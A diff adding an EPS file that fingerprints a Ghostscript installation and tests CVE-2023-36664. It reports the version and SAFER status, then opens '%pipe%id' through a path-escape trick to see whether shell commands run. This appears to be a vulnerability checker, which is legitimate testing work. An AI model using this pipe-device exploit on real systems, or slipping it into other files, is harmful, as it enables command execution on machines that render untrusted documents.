@@ -1,0 +1,56 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%Pages: 1
+%%BoundingBox:   36   36  576  756
+%%LanguageLevel: 1
+%%EndComments
+%%BeginProlog
+%%EndProlog
+
+1 1 1 setrgbcolor clippath fill
+
+/pagewidth currentpagedevice /PageSize get 1 get def
+
+/curpos pagewidth def
+
+/interval pagewidth 20 div def
+
+/Courier findfont interval scalefont setfont
+
+/showline {
+    0 0 0 setrgbcolor
+    /curpos curpos interval sub def
+    interval 1 mul curpos moveto
+    show
+} def
+
+/concat { exch dup length
+  2 index length add string
+  dup dup 4 2 roll copy length
+  4 -1 roll putinterval
+} bind def
+
+0 1 5 { () showline pop } for
+(Ghostscript detected) showline
+() showline
+(Revision : ) revision 10 string cvs concat showline
+(Rev date : ) revisiondate 10 string cvs concat showline
+(Product : ) showline
+() product 20 string cvs concat showline
+
+systemdict /SAFER get {
+  (dSAFER is enabled) showline
+
+  % try CVE-2023-36664
+  {
+    (%pipe%id&/../%rom%lib/test) (r) file
+  } stopped {
+    (CVE-2023-36664 patched) showline
+  }{
+    (CVE-2023-36664 works!!) showline
+  } ifelse % error catching frame
+}{
+  (dSAFER is disabled!!) showline
+} ifelse % error catching frame
+
+showpage
+0 quit
